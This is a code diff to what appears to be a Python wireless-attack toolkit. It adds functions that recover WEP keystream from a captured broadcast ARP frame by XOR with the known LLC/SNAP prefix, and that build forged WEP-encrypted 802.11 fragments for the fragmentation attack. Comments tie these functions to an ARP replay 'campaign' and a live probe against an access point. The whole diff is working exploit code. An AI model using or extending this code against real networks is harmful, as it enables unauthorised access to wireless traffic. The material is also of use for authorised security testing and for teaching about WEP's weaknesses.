@@ -48,6 +48,18 @@ def wep_encrypt(keystream: bytes, plaintext: bytes) -> bytes:
     return bytes(b ^ k for b, k in zip(blob, keystream))
 
 
+def arp_request_plaintext(
+    *, sender_mac: bytes, sender_ip: bytes, target_ip: bytes
+) -> bytes:
+    """The 36-byte cleartext of a broadcast ARP request (LLC/SNAP ++ ARP), as
+    it sits inside a WEP body before the ICV. Shared by ``forge_arp_request``
+    (encrypt it directly when we have >=40 B keystream) and fragmentation
+    (chop it into ≤16 tiny fragments when we only have an 8-B seed)."""
+    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
+        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
+    return _SNAP_ARP + _ARP_HDR + sender_mac + sender_ip + b"\x00" * 6 + target_ip
+
+
 def forge_arp_request(
     keystream: bytes,
     *,
@@ -61,12 +73,87 @@ def forge_arp_request(
     The caller (campaign) prepends the IV+KeyID this keystream belongs to and a
     ToDS MAC header, then hands it to WepArpReplay. target_mac is all-zero
     (unknown — it's a request)."""
-    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
-        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
-    plaintext = (
-        _SNAP_ARP + _ARP_HDR + sender_mac + sender_ip + b"\x00" * 6 + target_ip
+    plaintext = arp_request_plaintext(
+        sender_mac=sender_mac, sender_ip=sender_ip, target_ip=target_ip
     )
     return wep_encrypt(keystream, plaintext)
+
+
+def seed_keystream_from_arp(arp_body: bytes, *, want: int = 8) -> bytes:
+    """Recover the first ``want`` bytes of keystream (PRGA) from a captured
+    broadcast WEP ARP's encrypted body.
+
+    The body on the wire is ``IV(3) ++ KeyID(1) ++ RC4(plaintext ++ ICV)``. A
+    broadcast ARP's plaintext starts with the fixed 8-byte LLC/SNAP + ethertype
+    prefix ``AA AA 03 00 00 00 08 06`` — so XOR-ing the first ``want`` (<=8)
+    ciphertext bytes against that known prefix yields keystream tied to THIS
+    body's IV. That seed is the fragmentation attack's foothold. Returns the
+    keystream bytes; the IV they belong to is ``arp_body[:3]`` (caller's).
+    """
+    if want < 1 or want > 8:
+        raise ValueError("seed keystream is at most the 8-byte SNAP+ethertype")
+    cipher = arp_body[4:]  # skip IV(3)+KeyID(1)
+    if len(cipher) < want:
+        raise ValueError(f"body too short: need {want} cipher bytes")
+    known = (_SNAP_ARP)[:want]
+    return bytes(c ^ p for c, p in zip(cipher[:want], known))
+
+
+def build_fragments(
+    keystream: bytes,
+    iv: bytes,
+    payload: bytes,
+    *,
+    bssid: bytes,
+    source_mac: bytes,
+    dest_mac: bytes,
+    key_id: int = 0,
+    seq_num: int = 0,
+    max_fragments: int = 16,
+) -> list[bytes]:
+    """Split ``payload`` into ≤``max_fragments`` WEP-encrypted 802.11 fragments,
+    all sharing one ``iv``/``keystream`` (legal — each fragment is its own MPDU
+    with its own ICV; reusing the IV is exactly what makes a short seed useful).
+
+    Each fragment carries up to ``len(keystream) - 4`` plaintext bytes (4 go to
+    the per-fragment ICV). The AP reassembles the decrypted fragments into one
+    MSDU, re-encrypts under a single FRESH IV, and (for a broadcast DA) relays
+    it — that relayed frame is the attack's prize. Headers: ToDS+Protected,
+    More-Fragments set on all but the last, fragment number 0..n-1 in the low
+    nibble of Sequence-Control.
+
+    The 802.11 frame layout (no QoS, 3-address) mirrors arp_replay's builder so
+    the AP accepts it from our associated STA. Returns the fragment frames in
+    order. Pure/offline — verified by a simulated-reassembly round-trip test;
+    the LIVE question (does the AP actually reassemble + relay) is the probe's.
+    """
+    if len(iv) != 3:
+        raise ValueError("iv must be 3 bytes")
+    if len(bssid) != 6 or len(source_mac) != 6 or len(dest_mac) != 6:
+        raise ValueError("bssid/source_mac/dest_mac must be 6 bytes each")
+    cap = len(keystream) - 4
+    if cap < 1:
+        raise ValueError("keystream too short: need >=5 bytes (1 data + 4 ICV)")
+    chunks = [payload[i : i + cap] for i in range(0, len(payload), cap)] or [b""]
+    if len(chunks) > max_fragments:
+        raise ValueError(
+            f"payload needs {len(chunks)} fragments > max {max_fragments} "
+            f"(seed too short: {cap} data bytes/fragment)"
+        )
+    keyid_byte = bytes([(key_id & 0x03) << 6])
+    frames = []
+    for i, chunk in enumerate(chunks):
+        more_frag = 0x04 if i < len(chunks) - 1 else 0x00
+        fc1 = 0x01 | 0x40 | more_frag         # ToDS + Protected (+ MoreFrag)
+        seq_ctl = struct.pack("<H", ((seq_num & 0xFFF) << 4) | (i & 0x0F))
+        header = (
+            b"\x08" + bytes([fc1]) + b"\x00\x00"   # FC + Duration
+            + bssid + source_mac + dest_mac        # Addr1=RA, Addr2=TA, Addr3=DA
+            + seq_ctl
+        )
+        body = iv + keyid_byte + wep_encrypt(keystream, chunk)
+        frames.append(header + body)
+    return frames
 
 
 # The CRC32 residue: crc32(data ++ icv(data)) == this constant for ALL data
